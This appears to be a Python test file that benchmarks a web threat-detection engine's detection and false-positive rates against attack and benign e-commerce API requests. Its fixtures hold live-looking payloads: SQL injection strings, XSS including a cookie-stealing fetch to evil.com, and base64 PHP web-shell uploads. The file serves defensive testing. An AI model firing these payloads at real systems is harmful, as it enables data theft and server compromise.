import asyncio
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from app.core.engine import threat_engine
from app.models.schemas import RequestInspectionPayload, ThreatType

# 25 Known attack test cases across all 10 attack classes
ATTACK_TEST_CASES = [
    # SQL Injection
    ("GET", "/api/products", {"cat": "' UNION SELECT username, password FROM users --"}, None, ThreatType.SQL_INJECTION),
    ("POST", "/api/search", {}, "' OR 1=1; DROP TABLE orders; --", ThreatType.SQL_INJECTION),
    ("GET", "/api/item", {"id": "1; EXEC xp_cmdshell('dir')"}, None, ThreatType.SQL_INJECTION),
    ("GET", "/api/products", {"category": "shoes' AND SLEEP(5) --"}, None, ThreatType.SQL_INJECTION),
    
    # XSS
    ("POST", "/api/reviews", {}, '{"comment": "<script>alert(document.cookie)</script>"}', ThreatType.XSS),
    ("GET", "/api/search", {"q": "<img src=x onerror=alert(1)>"}, None, ThreatType.XSS),
    ("POST", "/api/comments", {}, '<svg/onload=fetch("http://evil.com/"+document.cookie)>', ThreatType.XSS),
    
    # Brute force (tested against auth path)
    ("POST", "/api/auth/login", {}, '{"user": "admin", "pass": "test"}', ThreatType.BRUTE_FORCE),
    
    # Malware upload
    ("POST", "/api/upload", {}, None, ThreatType.MALWARE_UPLOAD, "shell.php.jpg", "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXZsK"),
    ("POST", "/api/upload/avatar", {}, None, ThreatType.MALWARE_UPLOAD, "backdoor.php", "PD9waHAgZXZhbCgkX1BPU1RbJ2NvZGUnXSk7ID8+"),
    
    # API abuse & Parameter tampering
    ("POST", "/api/checkout", {}, '{"product_id": 1, "price": 0.00, "quantity": 1}', ThreatType.API_ABUSE),
    ("POST", "/api/users/profile", {}, '{"name": "Alice", "role": "admin"}', ThreatType.API_ABUSE),
    ("GET", "/.env", {}, None, ThreatType.API_ABUSE),
    ("GET", "/wp-admin/setup-config.php", {}, None, ThreatType.API_ABUSE),
    
    # Bot scraping
    ("GET", "/api/cart/batch-add", {"sku": "GPU-5090"}, None, ThreatType.BOT_ATTACK, None, None, "Scrapy/2.11.0"),
    ("GET", "/api/products", {}, None, ThreatType.BOT_ATTACK, None, None, "python-requests/2.31.0"),
    
    # Payment fraud
    ("POST", "/api/checkout/authorize", {}, '{"card_number": "4111111111111111", "amount": 0.50}', ThreatType.PAYMENT_FRAUD),
    
    # Data exfiltration
    ("GET", "/api/customers/export-all", {"limit": "100000", "export": "all"}, None, ThreatType.DATA_EXFILTRATION),
    ("GET", "/api/users/dump", {}, None, ThreatType.DATA_EXFILTRATION),
]

# 20 Benign normal e-commerce shopping requests
BENIGN_TEST_CASES = [
    ("GET", "/api/products", {"category": "electronics", "sort": "price_asc"}, None),
    ("GET", "/api/products/105", {}, None),
    ("GET", "/api/categories", {}, None),
    ("POST", "/api/cart/add", {}, '{"product_id": 105, "quantity": 2}'),
    ("GET", "/api/cart", {}, None),
    ("POST", "/api/cart/remove", {}, '{"product_id": 105}'),
    ("POST", "/api/checkout/calculate-tax", {}, '{"zip_code": "94016", "items": [{"id": 105, "quantity": 1}]}'),
    ("GET", "/api/store/locations", {"state": "CA"}, None),
    ("GET", "/api/reviews/product/204", {"page": "1", "per_page": "10"}, None),
    ("GET", "/api/faq", {}, None),
    ("GET", "/api/shipping-policy", {}, None),
    ("POST", "/api/newsletter/subscribe", {}, '{"email": "shopper@gmail.com"}'),
    ("GET", "/api/search", {"q": "blue running shoes size 10"}, None),
    ("GET", "/api/brand/nike", {}, None),
    ("GET", "/api/account/notifications", {}, None),
    ("GET", "/api/track-order", {"order_number": "ORD-2026-9912"}, None),
    ("POST", "/api/contact-us", {}, '{"name": "Aryan", "message": "When will the item be restocked?"}'),
    ("GET", "/api/currency/rates", {}, None),
    ("GET", "/api/recommendations", {"user_id": "cust_882"}, None),
    ("GET", "/api/header-deals", {}, None),
]

async def run_accuracy_test():
    print("\n--- RUNNING SENTINEL AI DETECTION ACCURACY & BENCHMARK SUITE ---")
    from app.storage.db import db
    db.unblock_ip("198.51.100.99")
    db.unblock_ip("172.56.21.90")
    
    # 1. Test Detection Rate on known attacks
    true_positives = 0
    total_attacks = len(ATTACK_TEST_CASES)

    for case in ATTACK_TEST_CASES:
        method = case[0]
        path = case[1]
        params = case[2]
        body = case[3]
        expected_type = case[4]
        filename = case[5] if len(case) > 5 else None
        b64 = case[6] if len(case) > 6 else None
        ua = case[7] if len(case) > 7 else "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

        payload = RequestInspectionPayload(
            method=method,
            path=path,
            query_params=params,
            body=body,
            client_ip="198.51.100.99",
            user_agent=ua,
            file_name=filename,
            file_content_base64=b64
        )

        # For brute force, trigger required threshold
        if expected_type == ThreatType.BRUTE_FORCE:
            for _ in range(7):
                await threat_engine.inspect_request(payload)

        res = await threat_engine.inspect_request(payload)
        if res.detected:
            true_positives += 1

    detection_rate = (true_positives / total_attacks) * 100.0

    # 2. Test False Positive Rate on clean traffic
    false_positives = 0
    total_benign = len(BENIGN_TEST_CASES)

    for method, path, params, body in BENIGN_TEST_CASES:
        payload = RequestInspectionPayload(
            method=method,
            path=path,
            query_params=params,
            body=body,
            client_ip="172.56.21.90",
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        )
        res = await threat_engine.inspect_request(payload)
        if res.detected and res.action_taken.value == "blocked":
            false_positives += 1

    false_positive_rate = (false_positives / total_benign) * 100.0

    print(f"Total Attacks Tested: {total_attacks}")
    print(f"Attacks Intercepted: {true_positives}")
    print(f"Detection Rate: {detection_rate:.2f}% (Target: >95%)")
    print(f"Clean Requests Tested: {total_benign}")
    print(f"False Positives: {false_positives}")
    print(f"False Positive Rate: {false_positive_rate:.2f}% (Target: <5%)")

    assert detection_rate >= 95.0, f"Detection rate {detection_rate}% failed threshold (>95%)"
    assert false_positive_rate < 5.0, f"False positive rate {false_positive_rate}% failed threshold (<5%)"
    print("✅ DETECTION ACCURACY & FALSE POSITIVE CRITERIA MET SUCCESSFULLY!\n")

if __name__ == "__main__":
    asyncio.run(run_accuracy_test())
